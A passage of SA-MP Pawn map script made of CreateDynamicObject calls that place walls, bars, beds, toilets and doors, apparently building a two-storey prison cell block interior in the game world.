	CreateDynamicObject(9339,2553.2200000,-1314.6600000,1034.4700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.2200000,-1314.6600000,1035.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2551.1100000,-1318.0000000,1032.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.4500000,-1307.2300000,1036.5700000,0.0000000,90.0000000,-269.6400000); //
	CreateDynamicObject(9339,2544.4500000,-1305.8900000,1036.5700000,0.0000000,90.0000000,-269.6400000); //
	CreateDynamicObject(9339,2544.4500000,-1304.6100000,1036.5700000,0.0000000,90.0000000,-269.6400000); //
	CreateDynamicObject(9339,2544.4500000,-1303.6900000,1036.5700000,0.0000000,90.0000000,-269.6400000); //
	CreateDynamicObject(9339,2544.4400000,-1302.2900000,1036.5500000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2549.0700000,-1314.6600000,1031.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.0700000,-1314.6600000,1032.4700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.0700000,-1314.6600000,1033.7900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.0700000,-1314.6800000,1035.1500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2546.9900000,-1317.9800000,1032.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.9700000,-1314.6600000,1031.0700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.9700000,-1314.6600000,1032.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.9700000,-1314.6600000,1033.7700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.9700000,-1314.6600000,1035.1100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2542.8500000,-1317.9800000,1032.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2540.8500000,-1314.6600000,1031.0700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2540.8500000,-1314.6600000,1032.3100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2540.8500000,-1314.6600000,1033.6100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2540.8500000,-1314.6600000,1034.8900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2538.7100000,-1317.9700000,1032.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2536.7700000,-1314.6600000,1031.0700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2536.7700000,-1314.6600000,1032.3100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2536.7700000,-1314.6600000,1033.4700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2536.7800000,-1314.6700000,1034.7700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.4500000,-1303.6100000,1036.5700000,0.0000000,90.0000000,-269.6400000); //
	CreateDynamicObject(9339,2544.4500000,-1304.4300000,1036.5700000,0.0000000,90.0000000,-269.6400000); //
	CreateDynamicObject(14437,2534.6900000,-1317.9800000,1032.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2532.6500000,-1314.6600000,1031.0300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2532.6700000,-1314.6600000,1032.3700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2532.6600000,-1314.6600000,1033.6900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2532.6600000,-1314.6600000,1034.7900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2531.0100000,-1317.9800000,1032.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2516.0000000,149.0000000,-1315.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2522.0000000,-1316.1300000,1031.0300000,0.0000000,0.0000000,-89.7000000); //
	CreateDynamicObject(9339,2522.0000000,-1316.1300000,1032.2600000,0.0000000,0.0000000,-89.7000000); //
	CreateDynamicObject(9339,2522.0000000,-1316.1500000,1033.6000000,0.0000000,0.0000000,-89.7000000); //
	CreateDynamicObject(9339,2522.0000000,-1316.1500000,1034.8200000,0.0000000,0.0000000,-89.7000000); //
	CreateDynamicObject(19456,2560.0000000,8279.0000000,-1280.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19456,2561.0800000,-1279.8700000,1035.6700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2561.0600000,-1279.8700000,1039.0700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2561.0800000,-1279.8400000,1041.3300000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2561.6400000,-1279.8700000,1032.2100000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2552.0400000,-1279.8900000,1032.2100000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2552.0400000,-1279.8900000,1035.6700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2552.0400000,-1279.8900000,1039.0700000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2552.0400000,-1279.8700000,1041.6900000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2542.4400000,-1279.8900000,1032.2100000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2542.4400000,-1279.8900000,1035.6900000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2542.4400000,-1279.8900000,1039.1500000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2542.4400000,-1279.8700000,1041.7100000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2532.8200000,-1279.9100000,1032.2100000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2532.8600000,-1279.8900000,1035.6900000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2532.8600000,-1279.8900000,1039.1500000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19456,2532.8600000,-1279.8700000,1041.3500000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(14437,2530.9900000,-1285.7400000,1032.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.3600000,-1301.7200000,1035.0800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2542.5200000,-1301.7200000,1035.0800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2542.5200000,-1301.7200000,1035.7000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2533.0300000,-1272.7400000,1031.1900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2533.0500000,-1272.7600000,1032.5700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2533.0500000,-1272.7600000,1033.9500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2533.0500000,-1272.7600000,1035.2900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2535.1500000,-1285.7600000,1032.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2537.2300000,-1272.7800000,1031.1900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2537.2400000,-1272.7600000,1032.5500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2537.2300000,-1272.7800000,1033.9100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2537.2300000,-1272.7800000,1035.3100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2539.2700000,-1285.7600000,1032.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2541.3200000,-1272.7600000,1031.1900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2541.2900000,-1272.7800000,1032.4900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2541.2900000,-1272.7800000,1033.8300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2541.2900000,-1272.7800000,1035.1700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2543.3900000,-1285.7600000,1032.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2545.4000000,-1272.7800000,1031.1900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2545.4000000,-1272.7800000,1032.4900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2545.3900000,-1272.7900000,1035.0300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2545.4000000,-1272.7800000,1033.7700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2547.4900000,-1285.7600000,1032.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.5600000,-1272.7800000,1031.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.5600000,-1272.7800000,1032.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.5600000,-1272.7800000,1033.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.5600000,-1272.7800000,1035.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2551.6300000,-1285.7600000,1032.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.6400000,-1272.7800000,1031.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.6400000,-1272.7800000,1032.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.6400000,-1272.7800000,1033.7700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.6400000,-1272.7800000,1035.1300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2555.7100000,-1285.7600000,1032.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.7800000,-1272.7800000,1031.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.7800000,-1272.7800000,1032.4500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.7600000,-1272.7800000,1033.7900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.7600000,-1272.7800000,1035.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.6800000,-1285.7200000,1035.0800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2542.4400000,-1285.7200000,1035.0800000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2542.4400000,-1285.7200000,1035.3000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2544.7000000,-1285.7200000,1035.3000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2544.8300000,-1285.1400000,1035.8900000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2544.8300000,-1283.7800000,1035.8900000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2544.8300000,-1282.4400000,1035.8900000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2544.8300000,-1281.1200000,1035.8900000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2544.8300000,-1279.8600000,1035.8900000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2571.2500000,-1310.3100000,1043.7600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2571.2500000,-1310.2900000,1045.0800000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2518.7900000,-1285.1400000,1035.8900000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2518.7900000,-1283.7600000,1035.8900000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2518.7900000,-1285.1400000,1035.8900000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2518.9300000,-1282.4600000,1035.8900000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2518.9300000,-1281.3200000,1035.9100000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(9339,2518.9300000,-1280.4400000,1035.9100000,0.0000000,90.0000000,-270.0000000); //
	CreateDynamicObject(14437,2534.6900000,-1318.0200000,1038.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2532.7000000,-1314.6900000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2532.7000000,-1314.7100000,1038.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2532.7000000,-1314.7100000,1041.4500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2532.7000000,-1314.7100000,1040.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2536.7200000,-1314.6900000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.5400000,-1301.7600000,1041.1600000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2536.7200000,-1314.6900000,1038.7300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2536.7200000,-1314.6900000,1040.0700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2536.7200000,-1314.6900000,1041.4300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.5400000,-1301.7600000,1042.4000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(14437,2538.8100000,-1318.0200000,1038.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2540.8200000,-1314.6900000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2536.7200000,-1314.6900000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2540.8200000,-1314.6900000,1038.7300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2540.8200000,-1314.6900000,1040.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2540.8200000,-1314.6900000,1041.4700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2542.9100000,-1318.0200000,1038.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.9800000,-1314.6800000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.9600000,-1314.6900000,1038.7300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.9600000,-1314.6900000,1040.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.9600000,-1314.6900000,1041.4700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2547.0300000,-1318.0200000,1038.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.1000000,-1314.6800000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2551.1700000,-1318.0200000,1038.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.1000000,-1314.6800000,1038.6900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.1000000,-1314.6800000,1040.0700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.1000000,-1314.7000000,1041.4500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.3000000,-1314.6800000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.3000000,-1314.6800000,1038.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.3000000,-1314.7000000,1040.1100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.3000000,-1314.7200000,1041.4900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2555.2700000,-1318.0200000,1038.5300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.3600000,-1314.6400000,1035.7500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.4400000,-1314.6700000,1037.0900000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.4400000,-1314.6700000,1038.4500000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.4400000,-1314.6700000,1039.6900000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.4400000,-1314.6900000,1040.8700000,180.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2533.1800000,-1272.6800000,1038.0300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2533.1800000,-1272.6800000,1039.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2533.1800000,-1272.6800000,1040.7700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2533.1800000,-1272.6800000,1042.1700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2537.2700000,-1272.6800000,1037.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2537.2700000,-1272.6800000,1038.7700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2537.2700000,-1272.6800000,1040.1700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2537.2700000,-1272.6800000,1041.5700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.8100000,-1285.1100000,1036.1500000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.8200000,-1285.1400000,1036.4300000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.7800000,-1285.1300000,1036.5900000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.7400000,-1283.7600000,1036.5900000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.7200000,-1282.3800000,1036.5900000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2533.1800000,-1272.6800000,1037.2100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2537.2700000,-1272.6800000,1036.4900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2535.2000000,-1285.6300000,1038.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.7000000,-1285.6000000,1041.4000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(9339,2544.7000000,-1285.6000000,1042.4000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(14437,2539.2600000,-1285.6500000,1038.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2541.3200000,-1272.6800000,1037.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2541.3200000,-1272.6800000,1038.7700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2541.3200000,-1272.6800000,1040.1500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2541.3200000,-1272.6800000,1041.5100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2543.4400000,-1285.6500000,1038.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.7700000,-1282.3900000,1036.1500000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.8100000,-1283.8400000,1036.1500000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.7700000,-1280.9900000,1036.1500000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.7700000,-1279.8900000,1036.1500000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.8100000,-1283.8400000,1036.3300000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.7700000,-1282.3900000,1036.3300000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.7700000,-1280.9900000,1036.4500000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2544.7700000,-1279.8900000,1036.4300000,-360.0000000,90.0000000,-89.9200000); //
	CreateDynamicObject(9339,2530.9400000,-1272.7600000,1036.5900000,-360.0000000,90.0000000,0.4400000); //
	CreateDynamicObject(9339,2530.9400000,-1272.7600000,1036.3300000,-360.0000000,90.0000000,0.4400000); //
	CreateDynamicObject(9339,2530.9400000,-1272.7600000,1036.1300000,-360.0000000,90.0000000,0.4400000); //
	CreateDynamicObject(9339,2545.4800000,-1272.6800000,1037.3900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2545.4800000,-1272.6800000,1038.7700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2545.4800000,-1272.6800000,1040.1500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2545.4800000,-1272.6800000,1041.5500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2547.5600000,-1285.6500000,1038.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.6200000,-1272.6800000,1037.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.6200000,-1272.6800000,1038.7900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.6200000,-1272.6800000,1040.1700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2549.6200000,-1272.6800000,1041.5500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2551.7000000,-1285.6500000,1038.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.7600000,-1272.6800000,1037.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.7600000,-1272.6800000,1038.7500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.7600000,-1272.6800000,1040.1100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2553.7600000,-1272.6800000,1041.4700000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(14437,2555.8000000,-1285.6500000,1038.7100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.6200000,-1272.6800000,1037.2300000,0.0000000,0.0000000,0.4200000); //
	CreateDynamicObject(9339,2557.7600000,-1272.7800000,1035.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.6200000,-1272.6800000,1038.6300000,0.0000000,0.0000000,0.4200000); //
	CreateDynamicObject(9339,2557.7600000,-1272.7800000,1035.0900000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2557.6200000,-1272.6800000,1039.9900000,0.0000000,0.0000000,0.4200000); //
	CreateDynamicObject(9339,2557.6200000,-1272.6800000,1041.3900000,0.0000000,0.0000000,0.4200000); //
	CreateDynamicObject(9339,2557.6200000,-1272.6800000,1041.9500000,0.0000000,0.0000000,0.4200000); //
	CreateDynamicObject(1505,2557.6900000,-1307.3400000,1030.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1505,2557.9000000,-1280.0300000,1030.4100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1505,2559.8700000,-1307.3800000,1036.6500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1505,2560.2400000,-1280.0000000,1036.6500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(9339,2544.2000000,-1301.7200000,1035.7000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1771,2554.0200000,-1306.0200000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2556.7600000,-1306.9900000,1030.4200000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2549.9600000,-1306.0200000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2552.5600000,-1306.9900000,1030.4200000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2545.8400000,-1306.0200000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2548.4000000,-1306.9900000,1030.4200000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2541.7400000,-1306.0200000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2544.3400000,-1306.9900000,1030.4200000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2537.6600000,-1306.0200000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2539.9800000,-1306.9900000,1030.4200000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2533.7000000,-1306.0200000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2535.9800000,-1306.9900000,1030.4200000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2530.1600000,-1306.0200000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2532.0400000,-1306.9900000,1030.4200000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2532.0900000,-1281.4000000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2530.1000000,-1280.4400000,1030.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2536.3300000,-1281.4000000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2533.7400000,-1280.4600000,1030.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2540.4500000,-1281.4000000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2537.9800000,-1280.4600000,1030.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2544.5100000,-1281.4000000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2542.0200000,-1280.4600000,1030.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2548.6900000,-1281.4000000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2546.1600000,-1280.4600000,1030.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2552.7500000,-1281.4000000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2550.3200000,-1280.4600000,1030.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2556.8500000,-1281.4000000,1031.0100000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2554.3800000,-1280.4600000,1030.4200000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2554.2200000,-1306.0200000,1037.3300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2556.7600000,-1306.9800000,1036.7400000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2549.9400000,-1306.0200000,1037.3300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2552.3000000,-1306.9800000,1036.7400000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2545.8300000,-1306.0000000,1037.3300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2548.2600000,-1306.9800000,1036.7400000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2541.7000000,-1306.0200000,1037.3300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2544.1600000,-1306.9800000,1036.7400000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2537.5800000,-1306.0200000,1037.3300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2540.0400000,-1306.9800000,1036.7400000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(1771,2533.5600000,-1306.0200000,1037.3300000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2535.8800000,-1306.9800000,1036.7400000,0.0000000,0.0000000,-180.0600000); //
	CreateDynamicObject(9339,2542.4400000,-1285.7200000,1036.0400000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1771,2536.3300000,-1281.4000000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2534.0400000,-1280.4600000,1036.7600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2540.4100000,-1281.4000000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2538.0600000,-1280.4600000,1036.7600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2544.5300000,-1281.4000000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2542.1200000,-1280.4600000,1036.7600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2548.6500000,-1281.4000000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2546.5000000,-1280.4500000,1036.7600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2552.7900000,-1281.4000000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2550.4400000,-1280.4500000,1036.7600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1771,2556.7500000,-1281.4000000,1037.3500000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2514,2554.6000000,-1280.4500000,1036.7600000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1557,2525.3900000,-1315.9800000,1030.4100000,0.0000000,0.0000000,0.0000000); //
